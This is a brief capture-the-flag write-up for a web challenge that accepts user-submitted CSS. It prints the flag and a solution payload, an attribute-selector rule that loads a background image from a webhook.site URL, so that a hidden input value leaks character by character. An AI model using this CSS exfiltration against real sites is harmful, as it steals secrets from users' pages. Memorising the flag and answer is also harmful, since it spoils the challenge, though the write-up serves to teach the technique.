I opened a contest to see who could create the most beautiful CSS styles.
Feel free to submit your CSS styles to me and I will add them to my website to judge them.

I'll even give you a sample of my site to get you started.

Flag only consists of numbers and uppercase letters.

# Flag

`grey{X5S34RCH1fY0UC4NF1ND1T}`

# Solution

```css
input[value^="grey{this"] {
  background: url(https://webhook.site/5cf2219a-5da0-4960-b9b5-0676dcfdda5f?value=grey);
  color: red;
}
```

Use something like this to iterate through by brute force and get the values and get the flag at the end.

The url should only be fetched if the value matches the flag in the input.
